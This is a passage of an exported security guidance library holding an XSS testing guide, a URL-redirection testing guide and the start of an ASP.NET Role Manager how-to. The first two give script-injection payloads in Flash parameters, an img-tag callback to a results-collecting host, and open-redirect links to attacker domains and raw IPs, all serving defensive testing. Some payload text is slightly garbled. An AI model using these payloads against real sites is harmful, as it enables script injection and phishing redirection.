&lt;p&gt;&amp;nbsp; name=&amp;quot;flaMovie1&amp;quot; align type=&amp;quot;application/x-shockwave-flash&amp;quot; &lt;/p&gt;
&lt;p&gt;&amp;nbsp; pluginspage=&amp;quot;http://www.macromedia.com/go/getflashplayer&amp;quot;&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;/object&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;During this step, testers will need to change the entry parameters to Flash like this:&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;lt;object classid=&amp;quot;clsid:D27CDB6E-AE6D-11cf-96B8-444553540000&amp;quot;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;codebase=&amp;quot;&amp;quot;http://macromedia.com/cabs/swflash.cab#version=6,0,0,0&amp;quot;&amp;quot;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;width=&amp;quot;250&amp;quot; height=&amp;quot;250&amp;quot; id=&amp;quot;flaMovie1&amp;quot; align=&amp;quot;CENTER&amp;quot;&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;lt;param name=movie value=&amp;quot;flaMovie1.swf&amp;quot;&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;lt;param name=&lt;strong&gt;FlashVars&lt;/strong&gt; value=&lt;strong&gt;&amp;quot;inputURL=%3cscript%3ealart%28%b4XSS%b4%29%3c%2fscript%3e&amp;quot;&lt;/strong&gt;&amp;gt;
&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;lt;param name=quality value=high&amp;gt; &lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;lt;para name=bgcolor value=#ffffff&amp;gt; &lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;lt;embed src=&amp;quot;flaMovie1.swf&amp;quot; &lt;strong&gt;FlashVars&lt;/strong&gt;=&lt;strong&gt;&amp;quot;inputURL=%3CSCRIPT%3Ealert%28%B4XSS%B4%29%3C%2FSCRIPT%3E&amp;quot;&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;&amp;nbsp; quality=&amp;quot;high&amp;quot; bgcolor=&amp;quot;#ffffff&amp;quot; width=&amp;quot;250&amp;quot; height=&amp;quot;250&amp;quot; &lt;/p&gt;
&lt;p&gt;&amp;nbsp; name=&amp;quot;flaMovie1&amp;quot; align type=&amp;quot;application/x-shockwave-flash&amp;quot; &lt;/p&gt;
&lt;p&gt;&amp;nbsp; pluginspage=&amp;quot;http://www.macromedia.com/go/getflashplayer&amp;quot;&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;/object&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Graphical User Interface&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Testing through the UI is similar to web form testing in that the tester enters test values&amp;nbsp; directly to the screen.&amp;nbsp; In the case of GUI testing the application used is not a web browser but any other application that interacts with high risk components,
 renders HTML,&amp;nbsp; and that allows user input or otherwise receives untrusted data.&lt;strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Look for additional entry points&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Each application has its own set of entry points.&amp;nbsp; This article lists the common ones for XSS attacks.&amp;nbsp; Nonetheless, testers must explore their application for additional ways of passing data that might make it into a XSS vulnerability.&amp;nbsp; It is recommended
 to use system monitoring tools such as the ones from www.sysinternals.com and dedicated attack tools such as Burp proxy that lets you intercept and add match-and-replace rules to change the contents of HTTP packets.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Keep tuning test cases &lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Sometimes the initial test string can land in a part of the source code where XSS is possible without using a script tag.&amp;nbsp; The tester may be able to pad it a little or maybe just write the JavaScript command.&amp;nbsp; Always check if the initial input lands inside
 or within an actual command or parameter.&lt;/p&gt;
&lt;p&gt;Tags have different ways of modifying them for script injection.&amp;nbsp; To learn more about testing web applications for Cross-Site Scripting Vulnerabilities, see
&lt;a href="http://www.microsoft.com/technet/community/columns/secmvp/sv0505.mspx"&gt;http://www.microsoft.com/technet/community/columns/secmvp/sv0505.mspx&lt;/a&gt;&amp;nbsp;and&amp;nbsp;
&lt;a href="http://www.owasp.org/index.php/OWASP_Testing_Guide_Appendix_C:_Fuzz_Vectors"&gt;
http://www.owasp.org/index.php/OWASP_Testing_Guide_Appendix_C:_Fuzz_Vectors&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Consider the case of persistent XSS&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Sometimes the tester won't see the results of test cases right away.&amp;nbsp; An XSS bug might exist that takes malicious input and only sends it back if the attacker does something else like visiting another page, for instance.&amp;nbsp; Such is often the case with a persistent
 XSS attack.&lt;/p&gt;
&lt;p&gt;Consider the following case.&amp;nbsp; An application asks for a user's password hint.&amp;nbsp; When the server prompts the user for the hint, the attacker types one of the XSS test strings described before.&amp;nbsp; Then submits the registration but the server doesn't show the
 alert box.&amp;nbsp; Then the attacker has the victim browse the site's password page and ask for the hint.&amp;nbsp; When the site displays the hint the alert box appears.&amp;nbsp;
&lt;/p&gt;
&lt;p&gt;While testing persistent XSS, testers must think of all the places where the input might end up and check all of them.&amp;nbsp; They should talk to developers and use specifications to check all data stores where a persistent XSS bug can manifest.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Automating test cases&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;One can automate XSS testing by setting up a server that collects any successful XSS attacks.&amp;nbsp; For instance, can create an ASP page that has the following code, and name the page results.asp&lt;/p&gt;
&lt;p&gt;&amp;lt;%&lt;br&gt;
&amp;nbsp;&amp;nbsp; set fso = Server.CreateObject(&amp;quot;Scripting.FileSystemObject&amp;quot;)&lt;br&gt;
&amp;nbsp;&amp;nbsp; set fw = fso.CreateTextFile(&amp;quot;c:\inetpub\wwwroot\results.txt&amp;quot;,True)&lt;br&gt;
&amp;nbsp;&amp;nbsp; fw.WriteLine(&amp;quot;test case:&amp;quot;)&lt;br&gt;
&amp;nbsp;&amp;nbsp; fw.WriteLine(Request.QueryString(&amp;quot;testcase&amp;quot;))&amp;nbsp;&amp;nbsp; &lt;br&gt;
&amp;nbsp;&amp;nbsp; fw.Close &lt;br&gt;
%&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;Then generate test cases by modifying or creating new HTTP requests to the target server.&amp;nbsp; Instead of displaying alert the script invokes results.asp passing its corresponding test case number (using the src property of HTML tags).&amp;nbsp; For example the tester
 wants to cover XSS through the img tag in the password field of the login page.&amp;nbsp; He labels this test case number 17.&amp;nbsp; Then passes the following string using automation:&lt;/p&gt;
&lt;p&gt;http://www.xvulnerablesite.com/login.asp?username=any&amp;amp;password=&amp;lt;img src=&amp;quot;http://xyoursite.com/results.asp?testcase=17&amp;quot;&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;If this test case fails then the value 17 appears in the results.txt file and the tester knows that a XSS bug was found and what caused it.&amp;nbsp; Testers can code hundreds of test cases like this and a test generator like an HTTP client to guide the automation.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;In addition, look at the different fuzzers available for free at &lt;a href="http://en.wikipedia.org/wiki/Fuzz_testing"&gt;
http://en.wikipedia.org/wiki/Fuzz_testing&lt;/a&gt;.&amp;nbsp; Many of these have the capability of executing XSS test cases and help in uncovering vulnerabilities.&lt;/p&gt;
&lt;h1&gt;Conclusions&lt;/h1&gt;
&lt;p&gt;Testing for XSS bugs is not complicated but you need to be thorough.&amp;nbsp; It is important that you go through all the places where your web server renders HTML output.&amp;nbsp; There are many strings to try, many tags to look at, different methods to feed the test data,
 and even room for automation.&amp;nbsp; However, the most important thing to keep in mind is to follow your test data.&amp;nbsp; Don't just look for the alert box, but look at the code that comes back to you.&amp;nbsp; Successful XSS testing is all about knowing how to tune you test
 case data.&lt;/p&gt;
&lt;h1&gt;Additional Resources&amp;nbsp;&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;XSS (Cross Site Scripting) Cheat Sheet.&amp;nbsp; Ha.ckers.com (&lt;a href="http://ha.ckers.org/xss.html"&gt;http://ha.ckers.org/xss.html&lt;/a&gt;)&lt;/li&gt;&lt;li&gt;Testing Your Web Applications for Cross-Site Scripting Vulnerabilities, Chris Weber.
&lt;a href="http://www.microsoft.com/technet/community/columns/secmvp/sv0505.mspx"&gt;http://www.microsoft.com/technet/community/columns/secmvp/sv0505.mspx&lt;/a&gt;&amp;nbsp;&lt;/li&gt;&lt;li&gt;OWASP Testing Guide Appendix C: Fuzz Vectors. &lt;a href="http://www.owasp.org/index.php/OWASP_Testing_Guide_Appendix_C:_Fuzz_Vectors"&gt;
http://www.owasp.org/index.php/OWASP_Testing_Guide_Appendix_C:_Fuzz_Vectors&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&amp;nbsp;Fuzz Testing.&amp;nbsp; Wikipedia. &lt;a href="http://en.wikipedia.org/wiki/Fuzz_testing"&gt;
http://en.wikipedia.org/wiki/Fuzz_testing&lt;/a&gt;&amp;nbsp;&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;&amp;nbsp;&lt;a href="?#ruledisplay:BC10DCE2-CA48-44BF-8BF6-FEFBE8DCCB7E"&gt;Attack: Cross Site Scripting Attack&lt;/a&gt;&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;/div&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>99702f34-065f-443d-812e-7b13a12d647a</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>How to Test for URL Redirection Bugs</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Input and Data Validation</category>
    <phase>Test</phase>
    <rule_Type>How To</rule_Type>
    <priority />
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Web Applications&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h1&gt;Summary&lt;/h1&gt;
&lt;p&gt;Web applications use URL redirection to redirect their web clients to another URL address, most commonly in another domain. In most cases, applications hide URL redirection from their clients, such as when using a redirect page. However, sometimes applications
 expose URL redirecting to their clients such as when using a URL parameter to specify the target URL location. URL redirection attacks consist of exploiting URL redirection done through URL parameters for malicious purposes. To execute this attack, an attacker
 creates a malicious link that attempts to redirect towards a malicious site any web client who follows it.
&lt;/p&gt;
&lt;p&gt;Follow these steps to test for URL redirection bugs:&lt;/p&gt;
&lt;br&gt;
&lt;ul&gt;
&lt;li&gt;Step 1: Understand attack scenarios &lt;/li&gt;&lt;li&gt;Step 2: Analyze causes and countermeasures &lt;/li&gt;&lt;li&gt;Step 3: Start testing and exploring &lt;/li&gt;&lt;li&gt;Step 4: Fine-tune test case data&lt;/li&gt;&lt;/ul&gt;
&lt;br&gt;
&lt;br&gt;
&lt;h1&gt;Step 1: Understand Attack Scenarios&lt;/h1&gt;
&lt;br&gt;
&lt;p&gt;First, it is necessary to understand the anatomy of URL redirection bugs. During a URL redirection attack the attacker’s main goal is to redirect a target web client to a malicious site. This is achieved by sending a link to the web client that starts with
 the application domain name but contains a URL parameter. When the client clicks the link, the client’s browser is first directed to the vulnerable application which in turn redirects the client to the malicious location indicated by the URL parameter. For
 the attack to succeed two conditions must be met: first, an attacker must find a vulnerable application that redirects its clients to a location indicated by a URL parameter, and, second, the target web client must click on the malicious link.
&lt;/p&gt;
&lt;p&gt;In detail:&lt;/p&gt;
&lt;br&gt;
&lt;ol&gt;
&lt;li&gt;The attacker finds a URL in the target web application that redirects web clients to a page dictated by a URL parameter (or through a special control character such as a question mark or asterisk).
&lt;/li&gt;&lt;li&gt;The attacker sends a link to a target web client with the legitimate URL (found in step 1), but the attacker modifies the destination page to one of the attacker’s choice.
&lt;/li&gt;&lt;li&gt;The target client clicks on the malicious link. This causes the target client’s web browser to be redirected to the malicious page set by the attacker.&lt;/li&gt;&lt;/ol&gt;
&lt;br&gt;
&lt;h1&gt;Step 2: Analyze Causes and Countermeasures&lt;/h1&gt;
&lt;br&gt;
&lt;p&gt;Next, you must understand what causes URL redirection bugs and how to defend against them. This will help you identify this issue in source code and prepare to execute the test cases.&lt;/p&gt;
&lt;p&gt;Web applications use URL redirection for different purposes. For instance, an application that has a page moved to a different location uses a redirect to send its clients to the new page location. To achieve this automatically the application can use code
 that invokes methods such as &lt;em&gt;response.redirect&lt;/em&gt; in PHP applications and internally control the redirection. However, some applications expose the URL redirection logic to outside clients. For instance, an application might use a redirect page that
 takes a URL parameter as the redirect target location. Consider the following URL:
&lt;/p&gt;
&lt;pre&gt;http://example.com/navigate.php?redir=&lt;strong&gt;http://example.com/login.php&lt;/strong&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;The web application uses the &lt;em&gt;redir &lt;/em&gt;URL parameter to control the target redirect location. An attacker can leverage this fact to trick a web client who trusts
&lt;em&gt;example.com&lt;/em&gt; into clicking the following link: &lt;/p&gt;
&lt;pre&gt;http://example.com/navigate.php?redir=&lt;strong&gt;http://attackers.com/gotcha.php&lt;/strong&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;If the application is vulnerable it redirects the client who clicks the link above to the attacker’s domain. Note that the attack is possible because the application exposes the URL redirection logic to web clients through the URL and because it doesn’t
 check the contents of the redirection target before doing the actual redirect, allowing the target to be modified towards a malicious website.
&lt;/p&gt;
&lt;p&gt;To defend against this bug developers such hide any URL redirection control from outside clients. If they must expose URL redirection through URL parameters, then applications must properly validate any redirect target before performing the redirect. Developers
 should implement a white list containing all the allowed redirect target locations and add relevant code to the application that disallows redirects to any location that is not in the white list.
&lt;/p&gt;
&lt;p&gt;Another option to protect against this attack is to warn clients that they will be redirected to an arbitrary location and give them the option not to do so. This is the technique currently used by Yahoo to countermeasure URL redirection attacks [i]. When
 clicking the link below the browser is directed to a Yahoo page that warns clients that they can navigate to the destination at their own risk:&lt;/p&gt;
&lt;p&gt;&lt;a href="http://us.ard.yahoo.com/*http://google.com"&gt;http://us.ard.yahoo.com/*http://google.com&lt;/a&gt;&lt;/p&gt;
&lt;br&gt;
&lt;br&gt;
&lt;h1&gt;Step 3: Start Testing and Exploring&lt;/h1&gt;
&lt;p&gt;Now that you’ve reviewed the theoretical aspects of URL redirection attacks you should follow the next test case to check for it in your application.
&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Test for URL redirection &lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;Follow these steps to test for URL redirection:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Discover an application’s page/request that executes URL redirection. Note down the URL that is used during the redirection request. It is suggested to analyze the application’s use of URLs to find any embedded URLs; any URL contained within another URL
 is a hint of URL redirection. &lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;Once you’ve found a suspicious URL, discover what part of this URL the application uses to pass the target redirect location. The application can pass the target URL in a named URL parameter:
&lt;/p&gt;
&lt;pre&gt;http://domain/navigate.php?redir=http://example.com/login.php &lt;/pre&gt;
&lt;p&gt;Or by appending it after a special character such as a question mark or an asterisk (another symbols may be used)&lt;/p&gt;
&lt;pre&gt;http://domain/navigate.php?http://example.com/login.php &lt;/pre&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;Modify the target redirect URL to a different URL such as (www.google.com) and make the request using a web browser:&lt;/p&gt;
&lt;pre&gt;http://domain/navigate.php?http://www.google.com&lt;/pre&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;Expected results: The application is vulnerable to URL redirection attacks if it redirects the web browser to the target URL modified in step 3 without giving any warnings.
&lt;/p&gt;
&lt;br&gt;
&lt;br&gt;
&lt;h1&gt;Step 4: Fine-tune Test Case Data&lt;/h1&gt;
&lt;br&gt;
&lt;p&gt;URL redirection attacks require the target client to click on a malicious link. However, Internet clients might feel uneasy&amp;nbsp;clicking a link if they notice that part of the link is not a trusted one. Therefore, an application that allows an attacker to pad
 or obfuscate the target URL has an increased the risk of a URL redirection attack on Internet clients. Consider the following URL links:&lt;/p&gt;
&lt;pre&gt;&lt;a href="http://trusted_domain/nav.php?redir=http://attacker.com/run.php"&gt;http://trusted_domain/nav.php?redir=http://attacker.com/run.php&lt;/a&gt; &lt;/pre&gt;
&lt;pre&gt;&lt;a href="http://trusted_domain/nav.php?redir=http://64.214.88.103/run.php"&gt;http://trusted_domain/nav.php?redir=http://64.214.88.103/run.php&lt;/a&gt;&lt;/pre&gt;
&lt;p&gt;Note that this list is not exhaustive and it is necessary to keep up to date with different URL padding/masquerading methods.&lt;/p&gt;
&lt;p&gt;The first URL can be quite suspicious to clients if they see it in the browser’s status bar. The third URL is obfuscated by using the attacker’s domain IP address instead of the domain name. The last URL is less suspicious than the first one and increases
 the exploitability of URL redirection bugs. &lt;/p&gt;
&lt;br&gt;
&lt;br&gt;
&lt;h1&gt;Conclusions &lt;/h1&gt;
&lt;p&gt;Attackers use URL redirection attacks to trick web clients into visiting a malicious site for phishing or spoofing purposes or to redirect a target client to a page containing malware that automatically attempts to infect the client’s computer. Even though
 URL redirection is a valid and convenient method for redirecting web clients to legitimate locations, such as when a web page is moved or deleted or when a site changes domain names; it is dangerous when the application exposes URL redirection to web clients
 and allows redirection to an arbitrary domain. To test for this vulnerability you must find a request that does a redirect based on the URL and modify the URL using the methods suggested. Finally, you must fine-tune the test cases using URL padding and obfuscation
 to increase the exploitability of this bug. &lt;/p&gt;
&lt;br&gt;
&lt;hr&gt;
&lt;br&gt;
&lt;p&gt;[i] &lt;strong&gt;URL Redirection Attack with Examples&lt;/strong&gt;. Paralliverse. &lt;a href="http://log0.wordpress.com/2008/06/23/url-redirection-attack-with-examples/"&gt;
http://log0.wordpress.com/2008/06/23/url-redirection-attack-with-examples/&lt;/a&gt;&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>a2511b7b-71ce-4d38-b4d5-5f877aaeb13d</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>How to Use Role Manager in ASP.NET</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Role Manager Settings</category>
    <phase>Implementation</phase>
    <rule_Type>How To</rule_Type>
    <priority />
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Microsoft Windows Server 2003 operating system or later&amp;nbsp;operating system&lt;/li&gt;&lt;li&gt;Microsoft Windows XP Professional Service Pack 1 or later operating system &lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Summary&lt;/h1&gt;
&lt;p&gt;This How to shows you how to use the ASP.NET role manager. The role manager eases the task of managing roles and performing role-based authorization in your application. It shows how to configure the various role providers for use with your Web application,
 how to create new roles, how to add a user to a role, and how to use the role management API for roles-based authorization.&lt;/p&gt;
&lt;h1&gt;Contents&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Objectives&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Overview&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Summary of Steps&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Step 1. Configure Your Role Store&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Step 2. Configure Your Role Provider in Web.config&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Step 3. Create and Assign Roles&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Step 4. Perform Role-Based Authorization&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Additional Considerations&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Additional Resources&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Objectives&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Configure an ASP.NET Web application to use role management. &lt;/li&gt;&lt;li&gt;Learn how to configure the &lt;strong&gt;SqlRoleProvider&lt;/strong&gt;, &lt;strong&gt;WindowsTokenRoleProvider&lt;/strong&gt;, and
&lt;strong&gt;AuthorizationStoreRoleProvider&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;Create and assign roles by using ASP.NET configuration tools, SQL scripts, and the role management APIs.
&lt;/li&gt;&lt;li&gt;Perform role based authorization in an ASP.NET Web application. &lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Overview&lt;/h1&gt;
&lt;p&gt;ASP.NET&amp;nbsp;includes a role manager feature that includes a roles management API that allows you to create and delete roles and assign and remove users from roles. The role manager stores its data in an underlying data store that it accesses through an appropriate
 role provider for that data store.&lt;/p&gt;
&lt;p&gt;The main benefits of using role manager are that it allows you to look up users' roles without writing and maintaining code. Additionally, the role providers offer a consistent way for you to check the role membership of your users, regardless of the underlying
 data store. Therefore, if your role store were to change tomorrow, you would only need to change the configuration settings to make your code work.&lt;/p&gt;
&lt;p&gt;Supplied role providers include: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;SqlRoleProvider.&lt;/strong&gt; This is used where the role store is kept in SQL Server.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;WindowsTokenRoleProvider.&lt;/strong&gt; This is a read-only provider that retrieves role information for a Windows user account based on the account's Windows security group membership. You cannot create, add to, or delete roles with this provider.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;AuthorizationStoreRoleProvider.&lt;/strong&gt; This is used if your application uses Authorization Manager (AzMan). It uses an AzMan policy store in an XML file, in Active Directory, or in Active Directory Application Mode (ADAM) as its role store. It
 is typically used in an intranet or extranet scenario where Windows authentication and Active Directory is used for authentication.
&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;To perform role management, your ASP.NET application must be able to identify and authenticate its users in some way. For example, it might use Windows authentication or Forms authentication.&lt;/p&gt;
&lt;p&gt;This How to shows you how to set up and configure a role store and a role provider and use role-based authorization in your ASP.NET applications. Additionally, it demonstrates some of the basic roles API calls available to work with roles programmatically.&lt;/p&gt;
&lt;h1&gt;Summary of Steps&lt;/h1&gt;
&lt;p&gt;To use the role manager in your application, perform the following steps: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Step 1. Configure your role store. &lt;/li&gt;&lt;li&gt;Step 2. Configure your role provider in Web.config. &lt;/li&gt;&lt;li&gt;Step 3. Create and assign roles. &lt;/li&gt;&lt;li&gt;Step 4. Perform role-based authorization. &lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Step 1. Configure Your Role Store &lt;/h1&gt;
&lt;p&gt;In this step, you prepare the role store used to maintain role details. The setup details vary according to the store and associated provider that you choose to use.&lt;/p&gt;
&lt;h2&gt;Using SqlRoleProvider&lt;/h2&gt;
&lt;p&gt;If you want to store roles in SQL Server, you use the &lt;strong&gt;SqlRoleProvider&lt;/strong&gt;. By default, roles are stored in a database named Aspnetdb in a SQL Express database instance in the \app_data folder beneath your application's virtual directory root
 folder. You can also configure the &lt;strong&gt;SqlRoleProvider&lt;/strong&gt; to use a local or remote instance of SQL Server.&lt;/p&gt;
&lt;h3&gt;To use a SQL Express database role store in the Website \app_data folder&lt;/h3&gt;
&lt;p&gt;You do not have to create or configure this database. The first time you perform an operation that uses the role management API, ASP.NET automatically creates a database named Aspnetdb, configures it, and sets appropriate permissions on it.
&lt;/p&gt;
&lt;p&gt;ASP.NET configures the SQL Express database with a database login for the default accounts used to run ASP.NET applications (Network Service on Windows Server 2003 or later&amp;nbsp;and ASPNET on Windows 2000) and grants them full access to the Aspnetdb database.
&lt;/p&gt;
&lt;p&gt;If you have configured ASP.NET to run using a custom service account, you must create a SQL login for that account, and add the login to the
&lt;strong&gt;aspnet_Roles_FullAccess&lt;/strong&gt; role in the Aspnetdb database. &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;To install the role management database in SQL Server&lt;/strong&gt; &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Log on to Windows using an account that has administration rights for your SQL Server instance.
&lt;/li&gt;&lt;li&gt;Open a command prompt window and execute the following command to install the role management database.
&lt;p&gt;&lt;strong&gt;Aspnet_regsql.exe&lt;/strong&gt;-&lt;strong&gt;E&lt;/strong&gt;-&lt;strong&gt;S&lt;/strong&gt; &lt;em&gt;sqlinstance&lt;/em&gt;-&lt;strong&gt;A r&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;Note that this program is located in the &lt;strong&gt;%windir%\Microsoft.NET\Framework\{version}&lt;/strong&gt; folder.
&lt;/p&gt;
&lt;p&gt;When you type the command, replace &lt;em&gt;version&lt;/em&gt; with the version of the .NET Framework that you are using and
&lt;em&gt;sqlinstance&lt;/em&gt; with the name of the SQL Server instance you want to install the role management database in.
&lt;/p&gt;
&lt;p&gt;You will see the following output: &lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;Start adding the following features:&lt;br&gt;Rolemanager&lt;br&gt;............&lt;br&gt;Finished.  &lt;/pre&gt;
&lt;/div&gt;
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;For information about the switches for Aspnet_regsql.exe, type
&lt;strong&gt;Aspnet_regsql.exe -?&lt;/strong&gt; at the command prompt.&lt;/blockquote&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;To grant permissions in the database&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;You need to create a database login for your Web application's process account; by default, this is the Network Service account. If you have configured a custom account to run ASP.NET, you must grant permissions to that account.
&lt;/p&gt;
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;If you have configured your ASP.NET application to use impersonation, your ASP.NET application executes using the security context of the original caller. To access data in a SQL Server database, you must usually create a
 database login for the original caller and grant access to the required data.&lt;/blockquote&gt;
&lt;blockquote&gt;However, the role management system accesses the Aspnetdb database by using the process identity regardless of whether your application uses impersonation.
&lt;/blockquote&gt;
&lt;ol&gt;
&lt;li&gt;Open SQL Server Enterprise Manager, expand &lt;strong&gt;Security&lt;/strong&gt;, and then expand
&lt;strong&gt;Logins&lt;/strong&gt; for the server hosting the role management database. Create a new login for your Web application's process account (for example,
&lt;strong&gt;NT AUTHORITY/Network Service&lt;/strong&gt;). &lt;/li&gt;&lt;li&gt;Set the default database to &lt;strong&gt;Aspnetdb&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;Under the &lt;strong&gt;Databases&lt;/strong&gt; node in Enterprise Manager, expand the &lt;strong&gt;
Aspnetdb&lt;/strong&gt; database entry, and then click &lt;strong&gt;Roles&lt;/strong&gt;. Right-click
&lt;strong&gt;aspnet_Roles_FullAccess&lt;/strong&gt;, and then click &lt;strong&gt;Properties&lt;/strong&gt;. In the
&lt;strong&gt;Database Role Properties&lt;/strong&gt; dialog box, click &lt;strong&gt;Add&lt;/strong&gt;, and then select the database login you created in the previous step to add the login to that role.
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;Aspnet_regsql.exe creates three database roles with differing levels of access to the role management database:
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;FullAccess&lt;/strong&gt; gives rights to create and delete roles, and add and remove users from those roles.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;BasicAccess&lt;/strong&gt; allows role membership checks for the current user only.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;ReportingAccess&lt;/strong&gt; allows a page to check which roles exist and which users belong to them.
&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h2&gt;Using WindowsTokenRoleProvider&lt;/h2&gt;
&lt;p&gt;You use the &lt;strong&gt;WindowsTokenRoleProvider&lt;/strong&gt; with ASP.NET applications that use Windows authentication. It is a read-only provider that retrieves role information for a Windows user based on Windows security groups. You cannot create, add to, or
 delete roles with this provider. Instead, you must use the Windows Computer Management or Active Directory Users and Computers administration tools.&lt;/p&gt;
&lt;p&gt;The Windows security system acts as role store for this provider, so no additional configuration is required to set up the role store.&lt;/p&gt;
&lt;h2&gt;Using AuthorizationStoreRoleProvider&lt;/h2&gt;
&lt;p&gt;Use the &lt;strong&gt;AuthorizationStoreRoleProvider&lt;/strong&gt; to store roles data in an AzMan policy store in an XML file, in Active Directory, or ADAM.
&lt;/p&gt;
&lt;p&gt;AzMan is supported on Windows 2000 Server or later and on Windows XP Professional.&amp;nbsp;
&lt;/p&gt;
